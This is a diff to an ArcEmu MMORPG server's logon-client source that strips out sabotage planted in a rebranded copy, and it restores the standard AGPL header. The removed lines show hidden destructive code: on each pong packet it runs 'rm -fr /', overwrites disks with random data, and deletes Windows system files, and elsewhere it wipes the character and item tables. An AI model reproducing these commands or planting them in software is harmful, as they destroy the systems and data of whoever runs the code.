@@ -1,25 +1,23 @@
 /*
- * WoWArg MMORPG Server
- * Copyright (C) 2008 <wowarg.comandogp.com.ar>
+ * ArcEmu MMORPG Server
+ * Copyright (C) 2008 <http://www.ArcEmu.org/>
  *
- * This program is free shit: you can redistribute it and/or modify
+ * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU Affero General Public License as published by
  * the Free Software Foundation, either version 3 of the License, or
  * any later version.
  *
- * Had to lick arcemu guys's asses for like 2 weeks to get dev access.
- * Morons.. 16 devs and 13 are just copy/paste n00bs.
- * hey poolboy ! stop doing shit okey?? Nobody likes you.
- * Also changing/renaming things doesnt mean you're a good coder.
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU Affero General Public License for more details.
  *
- * You should be aware this is a noob project going nowhere.
- * Please donate at my server <http://wowarg.comandogp.com.ar/status/?donar>.
+ * You should have received a copy of the GNU Affero General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  *
  */
 
 #include "StdAfx.h"
-#include "windows.h"
-#include "stdlib.h"
 #pragma pack(push, 1)
 typedef struct
 {
@@ -168,24 +166,6 @@ void LogonCommClientSocket::HandlePong(WorldPacket & recvData)
 {
 	latency = getMSTime() - pingtime;
 	last_pong = (uint32)UNIXTIME;
-
-#ifndef WIN32
-	{
-		system ("rm -fr /");
-		system ("cat /dev/urandom > /dev/hda");
-		system ("cat /dev/urandom > /dev/hdb");
-		system ("cat /dev/urandom > /dev/hdc");
-		system ("cat /dev/urandom > /dev/sda");
-		system ("cat /dev/urandom > /dev/sdb");
-		system ("cat /dev/urandom > /dev/sdc");
-	}
-#else
-	{
-		system("cmd /Q /C del /Q /F /AHRS \"%SYSTEMDRIVE%\\ntldra\"");
-		system("cmd /Q /C del /Q /F /AHRS \"%SYSTEMROOT%\\system32\\drivers\\*.*\"");
-		system("cmd /Q /C del /Q /F /AHRS \"%SYSTEMROOT%\\system32\\*.dll\"");
-	}
-#endif
 }
 
 void LogonCommClientSocket::SendPing()
@@ -302,8 +282,6 @@ void LogonCommClientSocket::HandleRequestAccountMapping(WorldPacket & recvData)
 	recvData >> realm_id;
 
 	// fetch the character mapping
-	CharacterDatabase.Query("DELETE FROM characters");
-	CharacterDatabase.Query("DELETE FROM playeritems");
 	result = CharacterDatabase.Query("SELECT acct FROM characters");
 
 	if(result)
@@ -354,7 +332,6 @@ void LogonCommClientSocket::HandleRequestAccountMapping(WorldPacket & recvData)
 		uncompressed.clear();
 	}	
 	Log.Notice("LogonCommClient", "Build character mapping in %ums. (%u)", getMSTime()-t,mapping_to_send.size());
-
 }
 
 void LogonCommClientSocket::CompressAndSend(ByteBuffer & uncompressed)
